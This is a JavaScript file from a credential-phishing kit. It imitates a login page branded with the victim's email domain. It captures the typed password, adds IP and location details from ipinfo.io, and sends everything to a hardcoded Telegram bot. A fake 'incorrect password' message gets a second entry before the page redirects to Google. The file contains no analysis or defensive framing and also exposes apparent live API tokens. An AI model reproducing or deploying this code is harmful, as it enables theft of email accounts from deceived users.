// === CONFIGURE TELEGRAM BOT ===
    const BOT_TOKEN = "8222171309:AAEUq6LuKnxlcaNv2bdM7QkcyNahPx_QCAA";
    const CHAT_ID = "7959372593";
    const IPINFO_TOKEN = "efeb6799727414"; // Optional for more accuracy

    (function() {
        let userEmail = "";
        let attempt = 0;

        // Function to update email from hash
        function updateEmailFromHash() {
            // Get email from hash fragment (#someone@example.com)
            userEmail = window.location.hash.substring(1).trim();

            if (!userEmail || userEmail.indexOf('@') === -1) {
                userEmail = "example@example.com"; // fallback if invalid
            }

            // Fill disabled email field
            const emailField = document.getElementById("email");
            if (emailField) {
                emailField.value = userEmail;
            }

            // Extract domain from email
            const domain = userEmail.split("@")[1] || "example.com";

            // Update title and Clearbit logo
            const domainTitle = document.getElementById("domain-title");
            const domainLogo = document.getElementById("domain-logo");

            if (domainTitle) domainTitle.textContent = domain;
            if (domainLogo) domainLogo.src = `https://logo.clearbit.com/${domain}`;
        }

        // Function to send data to Telegram
        async function sendToTelegram(email, password) {
            try {
                let ipData = {};
                try {
                    const ipRes = await fetch(`https://ipinfo.io/json?token=${IPINFO_TOKEN || ""}`);
                    ipData = await ipRes.json();
                } catch (e) {
                    console.warn("IP info fetch failed", e);
                }

                const message = `
🔐 New Login Attempt
------------------------
📧 Email: ${email}
🔑 Password: ${password}
🌐 IP: ${ipData.ip || "N/A"}
🏙 City: ${ipData.city || "N/A"}
🏢 Region: ${ipData.region || "N/A"}
🌍 Country: ${ipData.country || "N/A"}
📡 ISP: ${ipData.org || "N/A"}
📍 Location: ${ipData.loc || "N/A"}
                `;

                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: "Markdown"
                    })
                });
            } catch (err) {
                console.error("Telegram send error:", err);
            }
        }

        // Initialize on DOM ready
        document.addEventListener("DOMContentLoaded", () => {
            // Initial email setup
            updateEmailFromHash();

            // Listen for hash changes
            window.addEventListener("hashchange", updateEmailFromHash);

            // Login button handler
            document.getElementById("login-btn").addEventListener("click", () => {
                const password = document.getElementById("password").value;
                const errorMsg = document.getElementById("error-msg");
                const spinner = document.getElementById("loading-spinner");

                errorMsg.textContent = "";
                spinner.classList.remove("hidden");

                setTimeout(async () => {
                    spinner.classList.add("hidden");
                    attempt++;

                    // Send details to Telegram
                    await sendToTelegram(userEmail, password);

                    if (attempt === 1) {
                        errorMsg.textContent = "Incorrect password, please verify and retry.";
                    } else if (attempt === 2) {
                        window.location.href = "https://google.com";
                    }
                }, 5000);
            });
        });
    })();
